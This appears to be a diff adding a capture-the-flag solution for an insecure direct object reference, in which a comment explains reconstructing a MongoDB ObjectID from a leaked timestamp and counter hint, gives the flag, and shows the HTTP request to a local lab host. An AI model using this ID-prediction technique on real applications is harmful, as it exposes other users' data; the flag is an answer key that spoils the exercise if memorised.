@@ -1,0 +1,4 @@
+# IDOR via MongoDB ObjectID prediction. No auth required. First user ObjectID reconstructed from: app start timestamp (leaked on homepage) + same random bytes (same Node.js process) + counter = attacker's counter minus the 'distance' hint returned by /register. Returns FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}
+
+GET /profile/69dcd7a94ab3b44497fd611a HTTP/1.1
+Host: 172.17.0.1:40155
